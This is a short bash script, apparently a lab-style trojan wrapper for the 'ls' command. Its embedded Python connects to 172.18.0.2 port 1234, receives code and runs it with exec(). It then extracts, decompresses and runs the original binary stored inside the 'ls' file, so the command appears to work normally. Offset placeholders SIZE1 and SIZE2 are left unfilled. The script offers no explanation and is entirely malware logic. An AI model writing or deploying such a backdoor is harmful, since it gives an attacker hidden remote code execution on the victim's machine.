#!/usr/bin/bash

python3 << EOF
#!/usr/bin/env python3

import sys
import socket

server_ip = "172.18.0.2"
server_port = 1234

sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockfd.connect((server_ip, server_port))

print(f'Connected to {server_ip}:{server_port}')

code = sockfd.recv(4096).decode()
exec(code)

sockfd.close()

EOF


origfile="$(mktemp)"
cat ls | tail -c +$((SIZE1 - 1)) | head -c SIZE2 | xz -d > "$origfile"
chmod u+x "$origfile"
"$origfile" "$@"
rm "$origfile"


exit

